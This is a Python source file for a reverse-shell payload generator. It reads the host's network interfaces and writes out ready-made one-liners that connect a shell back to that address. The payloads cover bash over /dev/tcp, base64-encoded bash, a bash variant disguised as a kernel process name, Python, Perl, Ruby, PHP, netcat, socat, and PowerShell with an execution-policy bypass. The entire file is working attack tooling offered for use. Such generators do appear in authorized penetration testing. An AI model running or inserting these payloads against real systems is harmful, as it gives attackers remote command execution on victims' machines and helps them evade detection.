from __future__ import annotations

import base64
import subprocess


def _get_interfaces() -> dict[str, str]:
    result = {}
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
        iface = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                iface = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and iface:
                ip = line.split()[1].split("/")[0]
                if ip != "127.0.0.1":
                    result[iface] = ip
    except Exception:
        pass
    return result


def _b64(ip: str, port: int) -> str:
    raw = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return base64.b64encode(raw.encode()).decode()


def _build_payloads(ip: str, port: int) -> dict[str, str]:
    _CMD_PS = (
        f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        f"$s=$c.GetStream();"
        f"$w=New-Object IO.StreamWriter($s);$w.AutoFlush=$true;"
        f"$r=New-Object IO.StreamReader($s);"
        f"$cwd='C:\\';"
        f"while($c.Connected){{$w.Write(\"$cwd> \");$cmd=$r.ReadLine();"
        f"if($cmd -eq 'exit'){{break}};"
        f"$out=(cmd /c \"cd /d `\"$cwd`\" && $cmd\" 2>&1|Out-String).Trim();"
        f"$w.WriteLine($out)}};$c.Close()"
    )

    return {
        "bash":               f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        "bash (alt)":         f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash (b64)":         f"echo {_b64(ip, port)} | base64 -d | bash",
        "bash (spoof argv)":  f"exec -a '[kworker/0:1]' bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "sh":                 f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python3":            (
            f"python3 -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{ip}\",{port}));"
            f"[os.dup2(s.fileno(),f) for f in(0,1,2)];"
            f"pty.spawn(\"/bin/bash\")'"
        ),
        "python":             (
            f"python -c 'import os,pty,socket;"
            f"s=socket.socket();s.connect((\"{ip}\",{port}));"
            f"[os.dup2(s.fileno(),f) for f in(0,1,2)];"
            f"pty.spawn(\"/bin/bash\")'"
        ),
        "perl":               (
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'"
        ),
        "ruby":               (
            f"ruby -rsocket -e 'exit if fork;"
            f"c=TCPSocket.new(\"{ip}\",{port});"
            f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
        ),
        "php":                (
            f"php -r '$sock=fsockopen(\"{ip}\",{port});"
            f"exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
        ),
        "nc (traditional)":   f"nc -e /bin/bash {ip} {port}",
        "nc (openbsd)":        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "socat":              f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
        "powershell":         (
            f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
            f"$sb=([text.encoding]::ASCII).GetBytes($r2);"
            f"$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
        ),
        "cmd.exe":            f'powershell -nop -ep bypass -c "{_CMD_PS}"',
    }


class PayloadGenerator:
    def __init__(self, port: int = 4444):
        self.port = port

    def get_interfaces(self) -> dict[str, str]:
        return _get_interfaces()

    def for_interface(self, iface: str) -> dict[str, str] | None:
        interfaces = _get_interfaces()
        if iface not in interfaces:
            return None
        return _build_payloads(interfaces[iface], self.port)

    def for_all(self) -> dict[str, dict[str, str]]:
        return {
            iface: _build_payloads(ip, self.port)
            for iface, ip in _get_interfaces().items()
        }
